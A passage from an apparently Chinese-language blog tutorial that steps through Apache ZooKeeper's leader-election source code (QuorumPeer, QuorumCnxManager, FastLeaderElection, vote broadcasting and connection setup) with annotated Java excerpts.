class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!getView().containsKey(myid)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"My id "</span> + myid + <span class="string">" not in the peer list"</span>);</span><br><span class="line">     &#125;</span><br><span class="line">    loadDataBase();</span><br><span class="line">    startServerCnxnFactory();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        adminServer.start();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (AdminServerException e) &#123;</span><br><span class="line">        LOG.warn(<span class="string">"Problem starting AdminServer"</span>, e);</span><br><span class="line">        System.out.println(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 选举准备</span></span><br><span class="line">    startLeaderElection();</span><br><span class="line">    <span class="keyword">super</span>.start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">synchronized</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startLeaderElection</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (getPeerState() == ServerState.LOOKING) &#123;</span><br><span class="line">           <span class="comment">// 创建选票</span></span><br><span class="line">           <span class="comment">// （1）选票组件：epoch（leader 的任期代号）、zxid（某个 leader 当选期间执行的事务编号）、myid（serverid）</span></span><br><span class="line">           <span class="comment">// （2）开始选票时，都是先投自己</span></span><br><span class="line">           currentVote = <span class="keyword">new</span> Vote(myid, getLastLoggedZxid(), getCurrentEpoch());</span><br><span class="line">       &#125;</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">// 创建选举算法实例</span></span><br><span class="line">    <span class="keyword">this</span>.electionAlg = createElectionAlgorithm(electionType);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> Election <span class="title">createElectionAlgorithm</span><span class="params">(<span class="keyword">int</span> electionAlgorithm)</span></span>&#123;</span><br><span class="line">    Election le=<span class="keyword">null</span>;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="comment">// 1 创建 QuorumCnxnManager，负责选举过程中的所有网络通信</span></span><br><span class="line">        QuorumCnxManager qcm = createCnxnManager();</span><br><span class="line">        QuorumCnxManager oldQcm = qcmRef.getAndSet(qcm);</span><br><span class="line">        <span class="keyword">if</span> (oldQcm != <span class="keyword">null</span>) &#123;</span><br><span class="line">            LOG.warn(<span class="string">"Clobbering already-set QuorumCnxManager (restarting leader election?)"</span>);</span><br><span class="line">            oldQcm.halt();</span><br><span class="line">        &#125;</span><br><span class="line">        QuorumCnxManager.Listener listener = qcm.listener;</span><br><span class="line">        <span class="keyword">if</span>(listener != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="comment">// 2 启动监听线程</span></span><br><span class="line">            listener.start();</span><br><span class="line">            <span class="comment">// 3 准备开始选举</span></span><br><span class="line">            FastLeaderElection fle = <span class="keyword">new</span> FastLeaderElection(<span class="keyword">this</span>, qcm);</span><br><span class="line">            fle.start();</span><br><span class="line">            le = fle;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            LOG.error(<span class="string">"Null listener when initializing cnx manager"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 网络通信组件初始化</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> QuorumCnxManager <span class="title">createCnxnManager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> QuorumCnxManager(<span class="keyword">this</span>,</span><br><span class="line">            <span class="keyword">this</span>.getId(),</span><br><span class="line">            <span class="keyword">this</span>.getView(),</span><br><span class="line">            <span class="keyword">this</span>.authServer,</span><br><span class="line">            <span class="keyword">this</span>.authLearner,</span><br><span class="line">            <span class="keyword">this</span>.tickTime * <span class="keyword">this</span>.syncLimit,</span><br><span class="line">            <span class="keyword">this</span>.getQuorumListenOnAllIPs(),</span><br><span class="line">            <span class="keyword">this</span>.quorumCnxnThreadsSize,</span><br><span class="line">            <span class="keyword">this</span>.isQuorumSaslAuthEnabled());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">QuorumCnxManager</span><span class="params">(QuorumPeer self,</span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="keyword">final</span> <span class="keyword">long</span> mySid,</span></span></span><br><span class="line"><span class="function"><span class="params">                        Map&lt;Long,QuorumPeer.QuorumServer&gt; view,</span></span></span><br><span class="line"><span class="function"><span class="params">                        QuorumAuthServer authServer,</span></span></span><br><span class="line"><span class="function"><span class="params">                        QuorumAuthLearner authLearner,</span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="keyword">int</span> socketTimeout,</span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="keyword">boolean</span> listenOnAllIPs,</span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="keyword">int</span> quorumCnxnThreadsSize,</span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="keyword">boolean</span> quorumSaslAuthEnabled)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 创建各种队列</span></span><br><span class="line">    <span class="keyword">this</span>.recvQueue = <span class="keyword">new</span> ArrayBlockingQueue&lt;Message&gt;(RECV_CAPACITY);</span><br><span class="line">    <span class="keyword">this</span>.queueSendMap = <span class="keyword">new</span> ConcurrentHashMap&lt;Long, ArrayBlockingQueue&lt;ByteBuffer&gt;&gt;();</span><br><span class="line">    <span class="keyword">this</span>.senderWorkerMap = <span class="keyword">new</span> ConcurrentHashMap&lt;Long, SendWorker&gt;();</span><br><span class="line">    <span class="keyword">this</span>.lastMessageSent = <span class="keyword">new</span> ConcurrentHashMap&lt;Long, ByteBuffer&gt;();</span><br><span class="line"></span><br><span class="line">    String cnxToValue = System.getProperty(<span class="string">"zookeeper.cnxTimeout"</span>);</span><br><span class="line">    <span class="keyword">if</span>(cnxToValue != <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">this</span>.cnxTO = Integer.parseInt(cnxToValue);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.self = self;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.mySid = mySid;</span><br><span class="line">    <span class="keyword">this</span>.socketTimeout = socketTimeout;</span><br><span class="line">    <span class="keyword">this</span>.view = view;</span><br><span class="line">    <span class="keyword">this</span>.listenOnAllIPs = listenOnAllIPs;</span><br><span class="line"></span><br><span class="line">    initializeAuth(mySid, authServer, authLearner, quorumCnxnThreadsSize,</span><br><span class="line">            quorumSaslAuthEnabled);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Starts listener thread that waits for connection requests</span></span><br><span class="line">    listener = <span class="keyword">new</span> Listener();</span><br><span class="line">    listener.setName(<span class="string">"QuorumPeerListener"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>监听线程初始化，点击 QuorumCnxManager.Listener，找到对应的 run 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">  LOG.info(<span class="string">"My election bind port: "</span> + addr.toString());</span><br><span class="line">  setName(addr.toString());</span><br><span class="line">  <span class="comment">// 绑定服务器地址</span></span><br><span class="line">  ss.bind(addr);</span><br><span class="line">  <span class="comment">// 死循环</span></span><br><span class="line">  <span class="keyword">while</span> (!shutdown) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// 阻塞，等待处理请求</span></span><br><span class="line">          client = ss.accept();</span><br><span class="line">        ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选举准备，点击 FastLeaderElection</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">FastLeaderElection</span><span class="params">(QuorumPeer self, QuorumCnxManager manager)</span></span>&#123; <span class="keyword">this</span>.stop = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">this</span>.manager = manager;</span><br><span class="line">    starter(self, manager);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">starter</span><span class="params">(QuorumPeer self, QuorumCnxManager manager)</span> </span>&#123; <span class="keyword">this</span>.self = self;</span><br><span class="line">    proposedLeader = -<span class="number">1</span>;</span><br><span class="line">    proposedZxid = -<span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 初始化队列和信息</span></span><br><span class="line">    sendqueue = <span class="keyword">new</span> LinkedBlockingQueue&lt;ToSend&gt;();</span><br><span class="line">    recvqueue = <span class="keyword">new</span> LinkedBlockingQueue&lt;Notification&gt;(); <span class="keyword">this</span>.messenger = <span class="keyword">new</span> Messenger(manager);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-2-选举执行">4.2 选举执行</h3><p><img src="http://qnypic.shawncoding.top/blog/202402291817158.png" alt></p><p>QuorumPeer.java中执行<code> super.start();</code>就相当于执行 QuorumPeer.java 类中的 run()方法。当 Zookeeper 启动后，首先都是 Looking 状态，通过选举，让其中一台服务器成为 Leader，其他的服务器成为 Follower。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">        <span class="keyword">while</span> (running) &#123;</span><br><span class="line">            <span class="keyword">switch</span> (getPeerState()) &#123;</span><br><span class="line">            <span class="keyword">case</span> LOOKING:</span><br><span class="line">                LOG.info(<span class="string">"LOOKING"</span>);</span><br><span class="line">                ......</span><br><span class="line">                <span class="comment">// 进行选举，选举结束，返回最终成为 Leader 胜选的那张选票</span></span><br><span class="line">                 setCurrentVote(makeLEStrategy().lookForLeader());</span><br><span class="line">                ......</span><br><span class="line">            <span class="keyword">case</span> FOLLOWING:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                   LOG.info(<span class="string">"FOLLOWING"</span>);</span><br><span class="line">                    setFollower(makeFollower(logFactory));</span><br><span class="line">                    follower.followLeader();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                   LOG.warn(<span class="string">"Unexpected exception"</span>,e);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                   follower.shutdown();</span><br><span class="line">                   setFollower(<span class="keyword">null</span>);</span><br><span class="line">                   updateServerState();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> LEADING:</span><br><span class="line">                LOG.info(<span class="string">"LEADING"</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    setLeader(makeLeader(logFactory));</span><br><span class="line">                    leader.lead();</span><br><span class="line">                    setLeader(<span class="keyword">null</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    LOG.warn(<span class="string">"Unexpected exception"</span>,e);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (leader != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        leader.shutdown(<span class="string">"Forcing shutdown"</span>);</span><br><span class="line">                        setLeader(<span class="keyword">null</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    updateServerState();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            start_fle = Time.currentElapsedTime();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ctrl+alt+b 点击 lookForLeader()的实现类 FastLeaderElection.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Vote <span class="title">lookForLeader</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 正常启动中，所有其他服务器，都会给我发送一个投票</span></span><br><span class="line">         <span class="comment">// 保存每一个服务器的最新合法有效的投票</span></span><br><span class="line">        HashMap&lt;Long, Vote&gt; recvset = <span class="keyword">new</span> HashMap&lt;Long, Vote&gt;();</span><br><span class="line">        <span class="comment">// 存储合法选举之外的投票结果</span></span><br><span class="line">        HashMap&lt;Long, Vote&gt; outofelection = <span class="keyword">new</span> HashMap&lt;Long, Vote&gt;();</span><br><span class="line">        <span class="comment">// 一次选举的最大等待时间，默认值是 0.2s</span></span><br><span class="line">        <span class="keyword">int</span> notTimeout = finalizeWait;</span><br><span class="line">        <span class="comment">// 每发起一轮选举，logicalclock++</span></span><br><span class="line">        <span class="comment">// 在没有合法的 epoch 数据之前，都使用逻辑时钟代替</span></span><br><span class="line">        <span class="comment">// 选举 leader 的规则：依次比较 epoch（任期） zxid（事务 id） serverid（myid） 谁大谁当选 leader</span></span><br><span class="line">        <span class="keyword">synchronized</span>(<span class="keyword">this</span>)&#123;</span><br><span class="line">            <span class="comment">// 更新逻辑时钟，每进行一次选举，都需要更新逻辑时钟</span></span><br><span class="line">            logicalclock.incrementAndGet();</span><br><span class="line">            <span class="comment">// 更新选票（serverid， zxid, epoch）</span></span><br><span class="line">            updateProposal(getInitId(), getInitLastLoggedZxid(), getPeerEpoch());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        LOG.info(<span class="string">"New election. My id =  "</span> + self.getId() +</span><br><span class="line">                <span class="string">", proposed zxid=0x"</span> + Long.toHexString(proposedZxid));</span><br><span class="line">        <span class="comment">// 广播选票，把自己的选票发给其他服务器</span></span><br><span class="line">        sendNotifications();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Loop in which we exchange notifications until we find a leader</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="comment">// 一轮一轮的选举直到选举成功</span></span><br><span class="line">        <span class="keyword">while</span> ((self.getPeerState() == ServerState.LOOKING) &amp;&amp;</span><br><span class="line">                (!stop))&#123;</span><br><span class="line">     ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击 sendNotifications，广播选票，把自己的选票发给其他服务器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendNotifications</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 遍历投票参与者，给每台服务器发送选票</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">long</span> sid : self.getCurrentAndNextConfigVoters()) &#123;</span><br><span class="line">        QuorumVerifier qv = self.getQuorumVerifier();</span><br><span class="line">        <span class="comment">// 创建发送选票</span></span><br><span class="line">        ToSend notmsg = <span class="keyword">new</span> ToSend(ToSend.mType.notification,</span><br><span class="line">                proposedLeader,</span><br><span class="line">                proposedZxid,</span><br><span class="line">                logicalclock.get(),</span><br><span class="line">                QuorumPeer.ServerState.LOOKING,</span><br><span class="line">                sid,</span><br><span class="line">                proposedEpoch, qv.toString().getBytes());</span><br><span class="line">        <span class="keyword">if</span>(LOG.isDebugEnabled())&#123;</span><br><span class="line">            LOG.debug(<span class="string">"Sending Notification: "</span> + proposedLeader + <span class="string">" (n.leader), 0x"</span>  +</span><br><span class="line">                  Long.toHexString(proposedZxid) + <span class="string">" (n.zxid), 0x"</span> + Long.toHexString(logicalclock.get())  +</span><br><span class="line">                  <span class="string">" (n.round), "</span> + sid + <span class="string">" (recipient), "</span> + self.getId() +</span><br><span class="line">                  <span class="string">" (myid), 0x"</span> + Long.toHexString(proposedEpoch) + <span class="string">" (n.peerEpoch)"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 把发送选票放入发送队列</span></span><br><span class="line">        sendqueue.offer(notmsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 FastLeaderElection.java 类中查找 WorkerSender 线程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WorkerSender</span> <span class="keyword">extends</span> <span class="title">ZooKeeperThread</span> </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (!stop) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 队列阻塞，时刻准备接收要发送的选票</span></span><br><span class="line">                ToSend m = sendqueue.poll(<span class="number">3000</span>, TimeUnit.MILLISECONDS);</span><br><span class="line">                <span class="keyword">if</span>(m == <span class="keyword">null</span>) <span class="keyword">continue</span>;</span><br><span class="line">                <span class="comment">// 处理要发送的选票</span></span><br><span class="line">                process(m);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        LOG.info(<span class="string">"WorkerSender is down"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Called by run() once there is a new message to send.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> m     message to send</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">process</span><span class="params">(ToSend m)</span> </span>&#123;</span><br><span class="line">        ByteBuffer requestBuffer = buildMsg(m.state.ordinal(),</span><br><span class="line">                                            m.leader,</span><br><span class="line">                                            m.zxid,</span><br><span class="line">                                            m.electionEpoch,</span><br><span class="line">                                            m.peerEpoch,</span><br><span class="line">                                            m.configData);</span><br><span class="line">        <span class="comment">// 发送选票</span></span><br><span class="line">        manager.toSend(m.sid, requestBuffer);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">toSend</span><span class="params">(Long sid, ByteBuffer b)</span> </span>&#123; </span><br><span class="line">    <span class="comment">// 判断如果是发给自己的消息，直接进入自己的 RecvQueue</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.mySid == sid) &#123;</span><br><span class="line">         b.position(<span class="number">0</span>);</span><br><span class="line">         addToRecvQueue(<span class="keyword">new</span> Message(b.duplicate(), sid));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="comment">// 如果是发给其他服务器，创建对应的发送队列或者获取已经存在的发送队列</span></span><br><span class="line">          <span class="comment">// ，并把要发送的消息放入该队列</span></span><br><span class="line">         ArrayBlockingQueue&lt;ByteBuffer&gt; bq = <span class="keyword">new</span> ArrayBlockingQueue&lt;ByteBuffer&gt;(SEND_CAPACITY);</span><br><span class="line">         ArrayBlockingQueue&lt;ByteBuffer&gt; oldq = queueSendMap.putIfAbsent(sid, bq);</span><br><span class="line">         <span class="keyword">if</span> (oldq != <span class="keyword">null</span>) &#123;</span><br><span class="line">             addToSendQueue(oldq, b);</span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             addToSendQueue(bq, b);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="comment">// 将选票发送出去</span></span><br><span class="line">         connectOne(sid);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与要发送的服务器节点建立通信连接，创建并启动发送器线程和接收器线程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//connectOne-&gt;connectOne-&gt;initiateConnection-&gt;startConnection</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">startConnection</span><span class="params">(Socket sock, Long sid)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    DataOutputStream dout = <span class="keyword">null</span>;</span><br><span class="line">    DataInputStream din = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 通过输出流，向服务器发送数据</span></span><br><span class="line">        BufferedOutputStream buf = <span class="keyword">new</span> BufferedOutputStream(sock.getOutputStream());</span><br><span class="line">        dout = <span class="keyword">new</span> DataOutputStream(buf);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Sending id and challenge</span></span><br><span class="line">        <span class="comment">// represents protocol version (in other words - message type)</span></span><br><span class="line">        dout.writeLong(PROTOCOL_VERSION);</span><br><span class="line">        dout.writeLong(self.getId());</span><br><span class="line">        String addr = formatInetAddr(self.getElectionAddress());</span><br><span class="line">        <span class="keyword">byte</span>[] addr_bytes = addr.getBytes();</span><br><span class="line">        dout.writeInt(addr_bytes.length);</span><br><span class="line">        dout.write(addr_bytes);</span><br><span class="line">        